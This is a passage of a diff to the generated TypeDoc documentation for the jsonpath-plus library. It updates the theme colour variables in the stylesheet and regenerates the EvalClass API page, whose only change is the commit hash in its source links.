--light-color-active-menu-item: var(--light-color-accent);\n     --light-color-text: #222;\n     --light-color-text-aside: #6e6e6e;\n+\n+    --light-color-icon-background: var(--light-color-background);\n+    --light-color-icon-text: var(--light-color-text);\n+\n+    --light-color-comment-tag-text: var(--light-color-text);\n+    --light-color-comment-tag: var(--light-color-background);\n+\n     --light-color-link: #1f70c2;\n     --light-color-focus-outline: #3584e4;\n\n@@ -22,16 +28,17 @@\n--light-color-ts-function: #572be7;\n     --light-color-ts-class: #1f70c2;\n     --light-color-ts-interface: #108024;\n-    --light-color-ts-constructor: var(--light-color-ts-class);\n-    --light-color-ts-property: var(--light-color-ts-variable);\n-    --light-color-ts-method: var(--light-color-ts-function);\n+    --light-color-ts-constructor: #4d7fff;\n+    --light-color-ts-property: #ff984d;\n+    --light-color-ts-method: #ff4db8;\n+    --light-color-ts-reference: #ff4d82;\n     --light-color-ts-call-signature: var(--light-color-ts-method);\n     --light-color-ts-index-signature: var(--light-color-ts-property);\n     --light-color-ts-constructor-signature: var(--light-color-ts-constructor);\n     --light-color-ts-parameter: var(--light-color-ts-variable);\n     /* type literal not included as links will never be generated to it */\n     --light-color-ts-type-parameter: #a55c0e;\n-    --light-color-ts-accessor: var(--light-color-ts-property);\n+    --light-color-ts-accessor: #ff4d4d;\n     --light-color-ts-get-signature: var(--light-color-ts-accessor);\n     --light-color-ts-set-signature: var(--light-color-ts-accessor);\n     --light-color-ts-type-alias: #d51270;\n\n@@ -46,11 +53,17 @@\n--dark-color-background-secondary: #1e2024;\n     --dark-color-background-warning: #bebe00;\n     --dark-color-warning-text: #222;\n-    --dark-color-icon-background: var(--dark-color-background-secondary);\n     --dark-color-accent: #9096a2;\n     --dark-color-active-menu-item: #5d5d6a;\n     --dark-color-text: #f5f5f5;\n     --dark-color-text-aside: #dddddd;\n+\n+    --dark-color-icon-background: var(--dark-color-background-secondary);\n+    --dark-color-icon-text: var(--dark-color-text);\n+\n+    --dark-color-comment-tag-text: var(--dark-color-text);\n+    --dark-color-comment-tag: var(--dark-color-background);\n+\n     --dark-color-link: #00aff4;\n     --dark-color-focus-outline: #4c97f2;\n\n@@ -64,16 +77,17 @@\n--dark-color-ts-function: #a280ff;\n     --dark-color-ts-class: #8ac4ff;\n     --dark-color-ts-interface: #6cff87;\n-    --dark-color-ts-constructor: var(--dark-color-ts-class);\n-    --dark-color-ts-property: var(--dark-color-ts-variable);\n-    --dark-color-ts-method: var(--dark-color-ts-function);\n+    --dark-color-ts-constructor: #4d7fff;\n+    --dark-color-ts-property: #ff984d;\n+    --dark-color-ts-method: #ff4db8;\n+    --dark-color-ts-reference: #ff4d82;\n     --dark-color-ts-call-signature: var(--dark-color-ts-method);\n     --dark-color-ts-index-signature: var(--dark-color-ts-property);\n     --dark-color-ts-constructor-signature: var(--dark-color-ts-constructor);\n     --dark-color-ts-parameter: var(--dark-color-ts-variable);\n     /* type literal not included as links will never be generated to it */\n     --dark-color-ts-type-parameter: #e07d13;\n-    --dark-color-ts-accessor: var(--dark-color-ts-property);\n+    --dark-color-ts-accessor: #ff4d4d;\n     --dark-color-ts-get-signature: var(--dark-color-ts-accessor);\n     --dark-color-ts-set-signature: var(--dark-color-ts-accessor);\n     --dark-color-ts-type-alias: #ff6492;\n\n@@ -90,15 +104,22 @@\n--color-background-secondary: var(--light-color-background-secondary);\n         --color-background-warning: var(--light-color-background-warning);\n         --color-warning-text: var(--light-color-warning-text);\n-        --color-icon-background: var(--light-color-icon-background);\n         --color-accent: var(--light-color-accent);\n         --color-active-menu-item: var(--light-color-active-menu-item);\n         --color-text: var(--light-color-text);\n         --color-text-aside: var(--light-color-text-aside);\n+\n+        --color-icon-background: var(--light-color-icon-background);\n+        --color-icon-text: var(--light-color-icon-text);\n+\n+        --color-comment-tag-text: var(--light-color-text);\n+        --color-comment-tag: var(--light-color-background);\n+\n         --color-link: var(--light-color-link);\n         --color-focus-outline: var(--light-color-focus-outline);\n \n         --color-ts-keyword: var(--light-color-ts-keyword);\n+        --color-ts-project: var(--light-color-ts-project);\n         --color-ts-module: var(--light-color-ts-module);\n         --color-ts-namespace: var(--light-color-ts-namespace);\n         --color-ts-enum: var(--light-color-ts-enum);\n\n@@ -110,6 +131,7 @@\n--color-ts-constructor: var(--light-color-ts-constructor);\n         --color-ts-property: var(--light-color-ts-property);\n         --color-ts-method: var(--light-color-ts-method);\n+        --color-ts-reference: var(--light-color-ts-reference);\n         --color-ts-call-signature: var(--light-color-ts-call-signature);\n         --color-ts-index-signature: var(--light-color-ts-index-signature);\n         --color-ts-constructor-signature: var(\n\n@@ -134,15 +156,22 @@\n--color-background-secondary: var(--dark-color-background-secondary);\n         --color-background-warning: var(--dark-color-background-warning);\n         --color-warning-text: var(--dark-color-warning-text);\n-        --color-icon-background: var(--dark-color-icon-background);\n         --color-accent: var(--dark-color-accent);\n         --color-active-menu-item: var(--dark-color-active-menu-item);\n         --color-text: var(--dark-color-text);\n         --color-text-aside: var(--dark-color-text-aside);\n+\n+        --color-icon-background: var(--dark-color-icon-background);\n+        --color-icon-text: var(--dark-color-icon-text);\n+\n+        --color-comment-tag-text: var(--dark-color-text);\n+        --color-comment-tag: var(--dark-color-background);\n+\n         --color-link: var(--dark-color-link);\n         --color-focus-outline: var(--dark-color-focus-outline);\n \n         --color-ts-keyword: var(--dark-color-ts-keyword);\n+        --color-ts-project: var(--dark-color-ts-project);\n         --color-ts-module: var(--dark-color-ts-module);\n         --color-ts-namespace: var(--dark-color-ts-namespace);\n         --color-ts-enum: var(--dark-color-ts-enum);\n\n@@ -154,6 +183,7 @@\n--color-ts-constructor: var(--dark-color-ts-constructor);\n         --color-ts-property: var(--dark-color-ts-property);\n         --color-ts-method: var(--dark-color-ts-method);\n+        --color-ts-reference: var(--dark-color-ts-reference);\n         --color-ts-call-signature: var(--dark-color-ts-call-signature);\n         --color-ts-index-signature: var(--dark-color-ts-index-signature);\n         --color-ts-constructor-signature: var(\n\n@@ -190,10 +220,16 @@\nbody {\n     --color-active-menu-item: var(--light-color-active-menu-item);\n     --color-text: var(--light-color-text);\n     --color-text-aside: var(--light-color-text-aside);\n+    --color-icon-text: var(--light-color-icon-text);\n+\n+    --color-comment-tag-text: var(--light-color-text);\n+    --color-comment-tag: var(--light-color-background);\n+\n     --color-link: var(--light-color-link);\n     --color-focus-outline: var(--light-color-focus-outline);\n \n     --color-ts-keyword: var(--light-color-ts-keyword);\n+    --color-ts-project: var(--light-color-ts-project);\n     --color-ts-module: var(--light-color-ts-module);\n     --color-ts-namespace: var(--light-color-ts-namespace);\n     --color-ts-enum: var(--light-color-ts-enum);\n\n@@ -205,6 +241,7 @@\nbody {\n     --color-ts-constructor: var(--light-color-ts-constructor);\n     --color-ts-property: var(--light-color-ts-property);\n     --color-ts-method: var(--light-color-ts-method);\n+    --color-ts-reference: var(--light-color-ts-reference);\n     --color-ts-call-signature: var(--light-color-ts-call-signature);\n     --color-ts-index-signature: var(--light-color-ts-index-signature);\n     --color-ts-constructor-signature: var(\n\n@@ -232,10 +269,16 @@\nbody {\n     --color-active-menu-item: var(--dark-color-active-menu-item);\n     --color-text: var(--dark-color-text);\n     --color-text-aside: var(--dark-color-text-aside);\n+    --color-icon-text: var(--dark-color-icon-text);\n+\n+    --color-comment-tag-text: var(--dark-color-text);\n+    --color-comment-tag: var(--dark-color-background);\n+\n     --color-link: var(--dark-color-link);\n     --color-focus-outline: var(--dark-color-focus-outline);\n \n     --color-ts-keyword: var(--dark-color-ts-keyword);\n+    --color-ts-project: var(--dark-color-ts-project);\n     --color-ts-module: var(--dark-color-ts-module);\n     --color-ts-namespace: var(--dark-color-ts-namespace);\n     --color-ts-enum: var(--dark-color-ts-enum);\n\n@@ -247,6 +290,7 @@\nbody {\n     --color-ts-constructor: var(--dark-color-ts-constructor);\n     --color-ts-property: var(--dark-color-ts-property);\n     --color-ts-method: var(--dark-color-ts-method);\n+    --color-ts-reference: var(--dark-color-ts-reference);\n     --color-ts-call-signature: var(--dark-color-ts-call-signature);\n     --color-ts-index-signature: var(--dark-color-ts-index-signature);\n     --color-ts-constructor-signature: var(\n\n@@ -439,7 +483,6 @@\npre {\n \n pre {\n     position: relative;\n-    white-space: pre;\n     white-space: pre-wrap;\n     word-wrap: break-word;\n     padding: 10px;\n\n@@ -860,17 +903,19 @@\na.tsd-index-link {\n     margin-bottom: 0.75rem;\n }\n \n+.tsd-no-select {\n+    -webkit-user-select: none;\n+    -moz-user-select: none;\n+    -ms-user-select: none;\n+    user-select: none;\n+}\n .tsd-kind-icon {\n     margin-right: 0.5rem;\n     width: 1.25rem;\n     height: 1.25rem;\n     min-width: 1.25rem;\n     min-height: 1.25rem;\n }\n-.tsd-kind-icon path {\n-    transform-origin: center;\n-    transform: scale(1.1);\n-}\n .tsd-signature > .tsd-kind-icon {\n     margin-right: 0.8rem;\n }\n\n@@ -1242,6 +1287,9 @@\nimg {\n .tsd-kind-method {\n     color: var(--color-ts-method);\n }\n+.tsd-kind-reference {\n+    color: var(--color-ts-reference);\n+}\n .tsd-kind-call-signature {\n     color: var(--color-ts-call-signature);\n }\n\n@@ -1254,9 +1302,6 @@\nimg {\n .tsd-kind-parameter {\n     color: var(--color-ts-parameter);\n }\n-.tsd-kind-type-literal {\n-    color: var(--color-ts-type-literal);\n-}\n .tsd-kind-type-parameter {\n     color: var(--color-ts-type-parameter);\n }\n\n@@ -1435,7 +1480,7 @@\nimg {\n     }\n \n     .site-menu {\n-        margin-top: 1rem 0;\n+        margin-top: 1rem;\n     }\n \n     .page-menu,\n```\n\nFilename: docs/ts/classes/EvalClass.html:\n```\n@@ -1,3 +1,3 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>EvalClass | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"EvalClass.html\">EvalClass</a></li></ul><h1>Class EvalClass</h1></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L11\">jsonpath.d.ts:11</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Constructors</h3><div class=\"tsd-index-list\"><a href=\"EvalClass.html#constructor\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>EvalClass | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"EvalClass.html\">EvalClass</a></li></ul><h1>Class EvalClass</h1></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L11\">jsonpath.d.ts:11</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Constructors</h3><div class=\"tsd-index-list\"><a href=\"EvalClass.html#constructor\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a>\n </div></section><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Methods</h3><div class=\"tsd-index-list\"><a href=\"EvalClass.html#runInNewContext\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>run<wbr/>In<wbr/>New<wbr/>Context</span></a>\n-</div></section></div></details></section></section><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Constructors\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Constructors</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"constructor\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>constructor</span><a href=\"#constructor\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"constructor.new_EvalClass\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-constructor-signature\">new <wbr/>Eval<wbr/>Class</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><a href=\"#constructor.new_EvalClass\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">code</span>: <span class=\"tsd-signature-type\">string</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a href=\"EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L12\">jsonpath.d.ts:12</a></li></ul></aside></li></ul></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Methods\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Methods</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"runInNewContext\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>run<wbr/>In<wbr/>New<wbr/>Context</span><a href=\"#runInNewContext\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"runInNewContext.runInNewContext-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">run<wbr/>In<wbr/>New<wbr/>Context</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#runInNewContext.runInNewContext-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">context</span>: <span class=\"tsd-signature-type\">object</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L13\">jsonpath.d.ts:13</a></li></ul></aside></li></ul></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Constructors\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Constructors</summary><div><a href=\"#constructor\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Methods\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Methods</summary><div><a href=\"#runInNewContext\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>run<wbr/>In<wbr/>New<wbr/>Context</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+</div></section></div></details></section></section><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Constructors\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Constructors</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"constructor\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>constructor</span><a href=\"#constructor\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"constructor.new_EvalClass\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-constructor-signature\">new <wbr/>Eval<wbr/>Class</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><a href=\"#constructor.new_EvalClass\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">code</span>: <span class=\"tsd-signature-type\">string</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a href=\"EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L12\">jsonpath.d.ts:12</a></li></ul></aside></li></ul></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Methods\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Methods</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"runInNewContext\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>run<wbr/>In<wbr/>New<wbr/>Context</span><a href=\"#runInNewContext\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"runInNewContext.runInNewContext-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">run<wbr/>In<wbr/>New<wbr/>Context</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#runInNewContext.runInNewContext-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">context</span>: <span class=\"tsd-signature-type\">object</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L13\">jsonpath.d.ts:13</a></li></ul></aside></li></ul></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary 